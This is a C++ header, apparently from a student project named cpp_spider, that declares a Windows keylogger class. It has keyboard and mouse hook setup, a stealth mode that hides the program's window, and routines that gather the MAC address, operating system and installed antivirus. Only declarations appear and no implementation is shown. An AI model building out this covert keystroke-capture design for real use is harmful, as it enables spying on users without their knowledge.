//
// KeyLogger.hpp for cpp_spider in /mnt/c/Users/Public/Projets/Tek3/cpp_spider/includes
//
// Made by Jeremy Thoveron
// Login   <jeremy.thoveron-@epitech.net>
//
// Started on  Fri Sep 29 16:00:48 2017 Jeremy Thoveron
// Last update Wed Oct  4 19:20:26 2017 DESKTOP-EDP75AM
//

#ifndef CPP_SPIDER_KEYLOGGER_HPP
#define CPP_SPIDER_KEYLOGGER_HPP

#include	<fstream>
#include	<iostream>
#include	<string>
#include	<map>
#include	<windows.h>
#include	"IKeyLogger.hpp"
#include	"dataStructure.hpp"


namespace spider
{
  class 	WindowsKeyLogger : public IKeyLogger
  {
  private:
    t_register	*infos;
  public:

    ///brief std::map of the key that have a VK_CODE association
    static std::map<DWORD, std::string> const keys;

    ///brief std::map of the key for the azerty keyboard
    static std::map<int, std::string> const correlingTable;

    ///brief getter of the t_register attribute.
    t_register const &getInfos();

  public:

    ///brief constructor of the WindowsKeyLogger
    WindowsKeyLogger();

    ///brief destructor of the WindowsKeyLogger
    ~WindowsKeyLogger();

    ///brief init the hooks for the mouse and the keyboard
    void		initHooks();

    ///brief init the stealth mode to be sure that no windows is displayed when the keylogger is launched
    void		stealth();

    ///brief release the hooks for the mouse and the keyboard
    void		unHooks();

    ///brief retrieve the address mac
    void		getMacAddr();

    ///brief retrieve the operating system
    void		getOperatingSystem();

    ///brief retrieve the anti virus of the computer
    void		getAntiVirus();
  };
}

LRESULT CALLBACK handleKeyboard(int code, WPARAM wp, LPARAM lp);
LRESULT CALLBACK handleMouse(int code, WPARAM wp, LPARAM lp);
#endif //CPP_SPIDER_KEYLOGGER_HPP
